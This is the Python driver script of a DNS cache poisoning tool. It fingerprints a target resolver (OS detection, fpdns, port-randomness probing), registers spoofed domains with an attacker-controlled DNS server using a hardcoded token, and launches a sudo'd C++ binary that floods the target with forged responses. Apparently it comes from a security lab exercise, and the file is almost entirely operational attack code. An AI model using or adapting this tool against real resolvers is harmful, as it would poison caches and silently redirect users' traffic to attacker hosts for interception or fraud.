#!/usr/bin/python3
"""
    main.py
    1. set up env
    2. read, modify and write configs
    3. start poison...
"""
import json
import time
import random
import hashlib
import requests
import argparse
from src.dns_message.dns_message import DNSMessage
from src.dns_message.query import query
from src.detect.detect import OSDetect, get_fpdns_message, dns_server_random_client
from src.basic import execute_command, DEFAULT_BP, get_local_ip, is_ip_valid
from src.config import SRC_PATH, TEMP_PATH, CONFIG_OK, CPP_PATH, TEMP_PATH

class ConfigAndRun:
    def __init__(self, _config_path=SRC_PATH + "config.py"):
        self.config = dict()
        self.version = "0.0.2"
        self.query = query
        try:
            self.copy_config(_config_path)
            self.read_config(_config_path)
            self.check_config()
            self.main()
        except KeyboardInterrupt:
            DEFAULT_BP.warn("User Aborted!")
            exit(0)
        finally:
            self.write_config()

    def setup_env(self, _index="https://pypi.tuna.tsinghua.edu.cn/simple"):
        _requirments = ["colorama==0.3.7", "python_nmap==0.6.1", "scapy==2.4.3"]
        _exec_fmt = "sudo python3 -m pip install %s -i %s"
        try:
            for _p in _requirments:
                execute_command(_exec_fmt%(_p, _index))
        except Exception as e:
            DEFAULT_BP.error("class: %s, doc: %s" % (e.__class__, e.__doc__))
    
    def copy_config(self, _config_path=SRC_PATH + "config.py"):
        try:
            _src = open(_config_path, "r", encoding="utf-8")
            _dst = open(TEMP_PATH + "config_%s.py" % int(time.time() * 100000000), "w", encoding="utf-8")
            _dst.write(_src.read())
            DEFAULT_BP.info("Copy Over!")
            _src.close()
            _dst.close()
        except FileNotFoundError:
            DEFAULT_BP.error("File %s can not found" % _config_path)
        except Exception as e:
            DEFAULT_BP.error("Copy Failed Because of %s, %s" % (e.__class__, e.__doc__))
        finally:
            _src.close()
            _dst.close()

    def read_config(self, _config_path=SRC_PATH + "config.py"):
        with open(_config_path, "r", encoding="utf-8") as f:
            for _line in f.readlines():
                _strip_line = _line.strip()
                if _strip_line == '':
                    continue
                else:
                    _equal_pos = _line.find("=")
                    if _equal_pos == -1:
                        self.config[_strip_line] = ''
                    else:
                        self.config[_strip_line[0: _equal_pos].strip()] = _strip_line[_equal_pos + 1:].strip()
        DEFAULT_BP.info("Read Over!")


    def write_config(self, _config_path=SRC_PATH + "config.py"):
        if len(self.config) == 0:
            DEFAULT_BP.error("CONFIG is None!")
            return 
        with open(_config_path, "w", encoding="utf-8") as f:
            for _k, _v in self.config.items():
                if _v == '':
                    f.write("%s\n" % _k)
                else:
                    f.write("%s = %s\n" % (_k, _v))
        DEFAULT_BP.info("Write Over!")

    def check_config(self):
        if CONFIG_OK:
            DEFAULT_BP.info("All Packages Installed!")
        else:
            DEFAULT_BP.warn("Some Packages Not Installed, According to config File!")
            self.setup_env()
            self.config['CONFIG_OK'] = 'True'

    def check_ip(self, _ip_str):
        if is_ip_valid(_ip_str):
            DEFAULT_BP.info("IP '%s' is valid!" % _ip_str)
            return True
        else:
            DEFAULT_BP.error("IP '%s' is invalid" % _ip_str)
            return False

    def main(self):
        """
            parse the arguments, and execute related excutable file.
            1. [important] poison...
            2. [important] os detect and finger print detect
            3. [not that important] send and receive the dns message, known as a simple dns client
        """
        _parser = argparse.ArgumentParser(description="DNS Cache Poisoning Tools By NIST.\n")
        _parser.add_argument('-v', '--version', action='version', version='DNS Cache Poisoning Tools %s' % self.version, help="print the version and exit")
        _parser.add_argument('-f', '--file', default="", help="add f/file option to assign a configuration file")
        _parser.add_argument('--os-detect', action="store_true", help="add os-detect option, the program will execute the os detect(See in `man nmap`)")
        _parser.add_argument('--fp-detect', action="store_true", help="add fp-detect option, the program will execute the fpdns(See in `man fpdns`)")
        _parser.add_argument('--query', action="store_true", help="add query option, the program will execute dns query, you need to set the name and query-type")
        _parser.add_argument('--ports-detect', action="store_true", help="add ports-detect option, the program will detect the port scale, but the ports scale the program gets will be displaced by the ports scale user gived.")
        _parser.add_argument('-del', '--delete', action="store_true", help="add d/delete option, the program will delete the useless config files in `temp`")
        _parser.add_argument('-p', '--poison', action="store_true", help="add p/poison option, the program will excute the `dns_cache_poison`")
        _parser.add_argument('-u', '--user-ip', default=get_local_ip(), help="add u/user-ip option to assign the user's ip, default to the localhost")
        _parser.add_argument('-ai', '--authority-ip', default="", help="add ai/authoirty-ip option to assign the authority's ip, default to the user's assigned domain")
        _parser.add_argument('-ti', '--target-ip', default="", help="add ti/target-ip option to assign the target dns cache server's ip, must be assigned by user.")
        _parser.add_argument('-pi', '--port-min', type=int, help="add pi/port-min option to assign the minimum value of ports seq, default to 1024")
        _parser.add_argument('-pa', '--port-max', type=int, help="add pa/port-max option to assign the maximum value of ports seq, default to 65535")
        _parser.add_argument('-d', '--domain', default='example.com', help="add d/domain option to assign the domain name of this attack, default to example.com")
        _parser.add_argument('-an', '--authority-name', default='ns.dnslabattacker.net.', help="add an/authority-name option to assign the authority name the attacker controls, default to ns.dnslabattacker.net")
        _parser.add_argument('-fi', '--fake-authority-ip', default="10.245.146.73", help="add fi/fake-authority-ip option to assign the fake authority ip the attacker fake, default to 1.1.1.1")
        _parser.add_argument('-nc', '--name-count', default=100000, type=int, help="add nc/name-count option to assign the name's count, default to 100000")
        _parser.add_argument('-int', '--interval', default=100, type=int, help="add int/interval option to assign the time interval for changing the random domain name, default to 100")
        _parser.add_argument('-st', '--send-times', default=100, type=int, help="add st/send-times option to assign the sending times for one tuple [random domain, port], default to 100")
        _parser.add_argument("-qname", "--query-name", default="", help="add qname/query-name option to assign the name")
        _parser.add_argument("-qtype", "--query-type", default="A", help="add qtype/query-type option to assign query type, default to A")
        _parser.add_argument("-server", "--query-server", default="8.8.8.8", help="add server/query-server option to assign dns server, default to 8.8.8.8")
        _parser.add_argument("-qport", "--query-port", default=53, type=int, help="add qport/query-port option to assign port providing dns service, default to 53")
        _parser.add_argument("-time", "--read-times", default=500000, type=int, help="add time/read-times option to control DNS query timeout, default to 500000")        
        _parser.add_argument("--add-support", action="store_true", help="add add-support option to add a domain support to the domain-support-server the hacker owned")
        _parser.add_argument("-si", "--server-ip", default="10.245.146.73", help="add si/server-ip to assign support server")
        _parser.add_argument("-sd", "--support-domain", default="", help="add sd/support-domain to assign a domain you want to change")
        _parser.add_argument("-sdi", "--support-domain-ip", default="", help="add sdi/support-domain-ip to assign the ip the flow goes, default to server-ip")
        _parser.add_argument("--check-support", action="store_true", help="add check-support option, the program will check if the domain query on support server is available")
        _args = _parser.parse_args()
        # # check if the arguments are invalid, set just one operation.. 
        _os_detect_res = None
        _finger_printer_res = None
        if _args.file:
            _config_file = _args.file
            with open(_config_file, "r", encoding="utf-8") as f:
                _args.__dict__ = json.load(f)
        if _args.add_support:
            _server_ip, _support_domain, _support_domain_ip = _args.server_ip, _args.support_domain, _args.support_domain_ip
            if _support_domain_ip == "":
                _support_domain_ip = _server_ip
            DEFAULT_BP.info("Add domain %s to support server %s, flow goes: %s" % (_support_domain, _server_ip, _support_domain_ip))
            _res = requests.post("http://%s:45736" % _server_ip,
                    data={'token': hashlib.md5("forgive-me".encode()).hexdigest(), 'transaction_id': random.randint(0, 0xffff),
                            'domain': _support_domain, 'address': '10.245.146.73'})
            DEFAULT_BP.info(_res.text)
            if _args.check_support:
                DEFAULT_BP.info("Will Check if the domain query is available (after 1 second), waiting for the server restart")
                time.sleep(1)
                _args.query = True
                _args.query_name, _args.query_type, _args.query_server, _args.query_port, _args.read_times = "www." + _support_domain, "A", _server_ip, 53, 100000
        if _args.query:
            DEFAULT_BP.info("Select Query option, executing...")
            _name, _type, _server, _port, _read_times = _args.query_name, _args.query_type, _args.query_server, _args.query_port, _args.read_times
            print(_name, _type, _server, _port, _read_times)
            _dns_response = self.query(_name, _type, _server, _port, _read_times)
            if _dns_response is not None:
                DEFAULT_BP.info(_dns_response)
            return
        if _args.delete:
            DEFAULT_BP.warn("Will delete all config file in `temp`, the operation won't hope the second ACK!")
            execute_command("sudo rm %sconfig_*.py" % TEMP_PATH)
        if _args.os_detect:
            DEFAULT_BP.info("Select os-detect option, executing...")
            _target_ip = _args.target_ip
            if self.check_ip(_target_ip):
                os_detect = OSDetect()
                _os_detect_res = os_detect.os_detect(_target_ip)
                DEFAULT_BP.info("OS detect res: ns_os: %s, ns_cpe: %s" % (_os_detect_res['ns_os'], _os_detect_res['ns_cpe']))
            else:
                DEFAULT_BP.error("OS detect error, given ip is invalid!")
        if _args.fp_detect:
            DEFAULT_BP.info("Select fp-detect option, executing...")
            _target_ip = _args.target_ip
            if self.check_ip(_target_ip):
                _finger_printer_res = get_fpdns_message(_target_ip, _print_flag=False)
                DEFAULT_BP.info("Finger print detect res: %s" % _finger_printer_res)
            else:
                DEFAULT_BP.error("Finger print detect error, given ip is invalid!")
        if _args.ports_detect:
            DEFAULT_BP.info("Select ports-detect option, executing...")
            _target_ip = _args.target_ip
            if self.check_ip(_target_ip):
                _random_flag, _port_min, _port_max = dns_server_random_client(_dns_server=_target_ip)
                DEFAULT_BP.info("Ports detect res: is_random: %s, [%d, %d]" % (str(_random_flag), _port_min, _port_max))
            else:
                DEFAULT_BP.error("Ports detect error, given ip is invalid!")
        else:
            _port_min, _port_max = 1024, 65535
        if _args.poison:
            _run_flag = True
            DEFAULT_BP.info("Select poison option, checking arguments...")
            _user_ip = _args.user_ip
            _authority_ip = _args.authority_ip
            _target_ip = _args.target_ip
            if _args.port_min:
                _port_min = _args.port_min
            if _args.port_max:
                _port_max = _args.port_max
            _domain = _args.domain
            _authority_name = _args.authority_name
            _fake_authority_ip = _args.fake_authority_ip
            _name_count = _args.name_count
            _interval = _args.interval
            _send_times = _args.send_times
            # # check arguments and generate the first name in `domain`
            if self.check_ip(_user_ip) and self.check_ip(_authority_ip) and self.check_ip(_target_ip) and self.check_ip(_fake_authority_ip):
                DEFAULT_BP.info("IP arguments check: OK!")
            else:
                DEFAULT_BP.error("IP argments check: Something wrong happened!")
                _run_flag = False
            if _port_min >= _port_max or _port_min < 1024 or _port_min > 65535 or _port_max > 65536:
                DEFAULT_BP.error("Port scale given Error: [%d, %d]" % (_port_min, _port_max))
                _run_flag = False
            if not _domain.endswith("."):
                DEFAULT_BP.warn("Domain given doesn't end with `.`, the checking program will add!")
                _domain += '.'
            if not _authority_name.endswith("."):
                DEFAULT_BP.warn("Authority name given doesn't end with `.`, the checking program will add!")
                _authority_name += '.'
            if _interval < 0 or _interval > 65535:
                DEFAULT_BP.error("Interval is too big or too small, now interval: %d" % _interval)
                _run_flag = False
            elif _interval > 6000:
                DEFAULT_BP.warn("You set interval: %d, which will influence the performance!")
            if _send_times > 6000:
                DEFAULT_BP.warn("You set send times per random name: %d, which will influence the performance!" % _interval)
            if _run_flag:
                DEFAULT_BP.info("Arguments Checking Succeeded, executing the poisoning program...")
                _origin_name = "abcde." + _domain
                _execute_cmd = "sudo " + CPP_PATH + "dns_cache_poison {user_ip} {authority_ip} {target_ip} {port_min} {port_max} {origin_name} {domain_name} {authority_name} {fake_authority_name} {name_count} {interval} {send_times}".format(
                    user_ip=_user_ip, authority_ip=_authority_ip, target_ip=_target_ip,
                    port_min=_port_min, port_max=_port_max, 
                    origin_name=_origin_name, domain_name=_domain, 
                    authority_name=_authority_name, fake_authority_name=_fake_authority_ip, 
                    name_count=_name_count, interval=_interval, send_times=_send_times
                    )
                DEFAULT_BP.info(_execute_cmd)
                execute_command(_execute_cmd)
                if _args.check_support:
                    DEFAULT_BP.info("Will Check if the cache server has been attacked!")
                    _name, _type, _server, _port, _read_times = str(int(time.time())) + "." + _domain[:-1], "A", _target_ip, 53, 500000
                    print(_name, _type, _server, _port, _read_times)
                    _dns_response = self.query(_name, _type, _server, _port, _read_times)
                    if _dns_response is not None:
                        DEFAULT_BP.info(_dns_response)
            else:
                DEFAULT_BP.error("Argumens Checking Failed, the poisoning program will not execute, the scheduler will exit with -2")
                exit(-2)

if __name__ == "__main__":
    ConfigAndRun()